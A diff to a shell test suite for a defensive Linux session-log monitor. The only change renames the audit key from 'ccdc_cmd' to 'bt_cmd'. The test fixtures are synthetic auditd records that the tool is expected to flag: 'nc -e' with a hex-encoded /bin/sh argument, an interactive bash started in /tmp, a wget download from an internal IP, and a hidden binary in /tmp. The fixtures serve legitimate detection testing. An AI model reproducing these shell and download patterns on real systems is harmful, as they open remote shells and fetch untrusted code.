@@ -8,7 +8,7 @@
 . "$(dirname "$0")/helper.sh"
 SH=${TEST_SHELL:-sh}
 C="$T_ROOT/roles/linux/LX-41-session-log.sh"
-export CCDC_SKIP_VERIFY=1
+export BT_SKIP_VERIFY=1
 # shellcheck disable=SC2086
 run() { $SH "$C" "$@"; }
 O="$T_TMP/out"; R="$T_TMP/root"; ST="$T_TMP/state"
@@ -61,16 +61,16 @@ t_fail "a single failure from another IP is not flagged as brute force" grep -q 
 
 # ---- auditd execve: commands, hex args, allowlist ---------------------------
 cat >"$AUDIT" <<'EOF'
-type=SYSCALL msg=audit(1731631000.100:200): arch=c000003e syscall=59 success=yes uid=1000 tty=pts0 comm="ls" exe="/bin/ls" key="ccdc_cmd"
+type=SYSCALL msg=audit(1731631000.100:200): arch=c000003e syscall=59 success=yes uid=1000 tty=pts0 comm="ls" exe="/bin/ls" key="bt_cmd"
 type=EXECVE msg=audit(1731631000.100:200): argc=2 a0="ls" a1="-la"
 type=CWD msg=audit(1731631000.100:200): cwd="/home/alice"
-type=SYSCALL msg=audit(1731631000.200:201): arch=c000003e syscall=59 success=yes uid=1001 tty=pts1 comm="bash" exe="/bin/bash" key="ccdc_cmd"
+type=SYSCALL msg=audit(1731631000.200:201): arch=c000003e syscall=59 success=yes uid=1001 tty=pts1 comm="bash" exe="/bin/bash" key="bt_cmd"
 type=EXECVE msg=audit(1731631000.200:201): argc=2 a0="bash" a1="-i"
 type=CWD msg=audit(1731631000.200:201): cwd="/tmp"
-type=SYSCALL msg=audit(1731631000.300:202): arch=c000003e syscall=59 success=yes uid=0 tty=pts0 comm="nc" exe="/bin/nc" key="ccdc_cmd"
+type=SYSCALL msg=audit(1731631000.300:202): arch=c000003e syscall=59 success=yes uid=0 tty=pts0 comm="nc" exe="/bin/nc" key="bt_cmd"
 type=EXECVE msg=audit(1731631000.300:202): argc=3 a0="nc" a1="-e" a2=2F62696E2F7368
 type=CWD msg=audit(1731631000.300:202): cwd="/root"
-type=SYSCALL msg=audit(1731631000.400:203): arch=c000003e syscall=59 success=no uid=1001 tty=pts1 comm="id" exe="/usr/bin/id" key="ccdc_cmd"
+type=SYSCALL msg=audit(1731631000.400:203): arch=c000003e syscall=59 success=no uid=1001 tty=pts1 comm="id" exe="/usr/bin/id" key="bt_cmd"
 type=EXECVE msg=audit(1731631000.400:203): argc=1 a0="id"
 EOF
 # A fresh state so the command pass starts clean.
@@ -96,7 +96,7 @@ ST4="$T_TMP/state4"
 run --out "$O" --state "$ST4" --root "$R" --no-color >/dev/null 2>&1   # pass 1: from now, nothing new
 r=$(run --out "$O" --state "$ST4" --root "$R" --no-color 2>&1)
 t_has "$r" "0 login event(s), 0 command(s)" "second pass with no new lines is quiet"
-printf 'type=SYSCALL msg=audit(1731631009.0:209): arch=c000003e syscall=59 success=yes uid=1001 tty=pts1 comm="wget" exe="/usr/bin/wget" key="ccdc_cmd"\ntype=EXECVE msg=audit(1731631009.0:209): argc=2 a0="wget" a1="http://10.9.9.9/x"\n' >>"$AUDIT"
+printf 'type=SYSCALL msg=audit(1731631009.0:209): arch=c000003e syscall=59 success=yes uid=1001 tty=pts1 comm="wget" exe="/usr/bin/wget" key="bt_cmd"\ntype=EXECVE msg=audit(1731631009.0:209): argc=2 a0="wget" a1="http://10.9.9.9/x"\n' >>"$AUDIT"
 r=$(run --out "$O" --state "$ST4" --root "$R" --no-color 2>&1)
 t_has "$r" "1 command(s)" "a newly appended command is picked up"
 t_ok "non-admin wget is flagged" grep -q 'commands bob .* wget' "$ST4/alerts.log"
@@ -114,13 +114,13 @@ SR="$T_TMP/statereal"; mkdir -p "$SR"
 NONE="(none)"   # what auditd writes for "no terminal"
 printf 'postfix:x:105:110::/var/spool/postfix:/usr/sbin/nologin\n' >>"$R/etc/passwd"
 cat >"$AUDIT" <<EOF2
-type=SYSCALL msg=audit(1731631200.1:500): arch=c000003e syscall=59 success=yes exit=0 ppid=10 pid=11 auid=1001 uid=0 gid=0 euid=0 tty=pts1 ses=3 comm="cat" exe="/usr/bin/cat" key="ccdc_cmd"
+type=SYSCALL msg=audit(1731631200.1:500): arch=c000003e syscall=59 success=yes exit=0 ppid=10 pid=11 auid=1001 uid=0 gid=0 euid=0 tty=pts1 ses=3 comm="cat" exe="/usr/bin/cat" key="bt_cmd"
 type=EXECVE msg=audit(1731631200.1:500): argc=2 a0="cat" a1="notes.txt"
 type=CWD msg=audit(1731631200.1:500): cwd="/root"
-type=SYSCALL msg=audit(1731631200.2:501): arch=c000003e syscall=59 success=yes exit=0 ppid=1 pid=12 auid=4294967295 uid=105 gid=110 tty=${NONE} ses=4294967295 comm="pickup" exe="/usr/lib/postfix/pickup" key="ccdc_cmd"
+type=SYSCALL msg=audit(1731631200.2:501): arch=c000003e syscall=59 success=yes exit=0 ppid=1 pid=12 auid=4294967295 uid=105 gid=110 tty=${NONE} ses=4294967295 comm="pickup" exe="/usr/lib/postfix/pickup" key="bt_cmd"
 type=EXECVE msg=audit(1731631200.2:501): argc=1 a0="pickup"
 type=CWD msg=audit(1731631200.2:501): cwd="/var/spool/postfix"
-type=SYSCALL msg=audit(1731631200.3:502): arch=c000003e syscall=59 success=yes exit=0 ppid=20 pid=21 auid=1000 uid=0 gid=0 tty=pts0 ses=1 comm="awk" exe="/usr/bin/awk" key="ccdc_cmd"
+type=SYSCALL msg=audit(1731631200.3:502): arch=c000003e syscall=59 success=yes exit=0 ppid=20 pid=21 auid=1000 uid=0 gid=0 tty=pts0 ses=1 comm="awk" exe="/usr/bin/awk" key="bt_cmd"
 type=EXECVE msg=audit(1731631200.3:502): argc=2 a0="awk" a1="-f"
 type=CWD msg=audit(1731631200.3:502): cwd="$SR"
 EOF2
@@ -134,7 +134,7 @@ t_fail "commands run from the state folder (this script) are left out" grep -q '
 
 t_start "repeats are held back"
 cat >>"$AUDIT" <<'EOF2'
-type=SYSCALL msg=audit(1731631300.1:510): arch=c000003e syscall=59 success=yes exit=0 ppid=10 pid=31 auid=1001 uid=0 gid=0 tty=pts1 comm="cat" exe="/usr/bin/cat" key="ccdc_cmd"
+type=SYSCALL msg=audit(1731631300.1:510): arch=c000003e syscall=59 success=yes exit=0 ppid=10 pid=31 auid=1001 uid=0 gid=0 tty=pts1 comm="cat" exe="/usr/bin/cat" key="bt_cmd"
 type=EXECVE msg=audit(1731631300.1:510): argc=2 a0="cat" a1="notes.txt"
 type=CWD msg=audit(1731631300.1:510): cwd="/root"
 EOF2
@@ -143,7 +143,7 @@ t_has "$r" "1 repeat(s) not shown" "the same alert again is counted, not shown"
 t_eq "$(grep -c 'cat notes.txt' "$SR/alerts.log")" 1 "and not written to alerts.log twice"
 t_eq "$(grep -c 'cat notes.txt' "$SR/commands.log")" 2 "but the command is logged both times"
 cat >>"$AUDIT" <<'EOF2'
-type=SYSCALL msg=audit(1731631400.1:520): arch=c000003e syscall=59 success=yes exit=0 ppid=10 pid=41 auid=1001 uid=0 gid=0 tty=pts1 comm="cat" exe="/usr/bin/cat" key="ccdc_cmd"
+type=SYSCALL msg=audit(1731631400.1:520): arch=c000003e syscall=59 success=yes exit=0 ppid=10 pid=41 auid=1001 uid=0 gid=0 tty=pts1 comm="cat" exe="/usr/bin/cat" key="bt_cmd"
 type=EXECVE msg=audit(1731631400.1:520): argc=2 a0="cat" a1="notes.txt"
 type=CWD msg=audit(1731631400.1:520): cwd="/root"
 EOF2
@@ -218,10 +218,10 @@ t_ok "web.log keeps the request's own time" grep -q '^15/Nov/2026:03:00:04 -0500
 mkdir -p "$R/var/www/html/uploads" "$R/var/log/apache2"
 t_start "web shell: command by the web-server user, and process origin"
 cat >"$AUDIT" <<'EOF2'
-type=SYSCALL msg=audit(1731631100.1:400): arch=c000003e syscall=59 success=yes uid=33 tty=pts9 comm="id" exe="/usr/bin/id" key="ccdc_cmd"
+type=SYSCALL msg=audit(1731631100.1:400): arch=c000003e syscall=59 success=yes uid=33 tty=pts9 comm="id" exe="/usr/bin/id" key="bt_cmd"
 type=EXECVE msg=audit(1731631100.1:400): argc=1 a0="id"
 type=CWD msg=audit(1731631100.1:400): cwd="/var/www/html"
-type=SYSCALL msg=audit(1731631100.2:401): arch=c000003e syscall=59 success=yes uid=1000 tty=pts0 comm="x" exe="/tmp/.x" key="ccdc_cmd"
+type=SYSCALL msg=audit(1731631100.2:401): arch=c000003e syscall=59 success=yes uid=1000 tty=pts0 comm="x" exe="/tmp/.x" key="bt_cmd"
 type=EXECVE msg=audit(1731631100.2:401): argc=1 a0="/tmp/.x"
 type=CWD msg=audit(1731631100.2:401): cwd="/tmp"
 EOF2
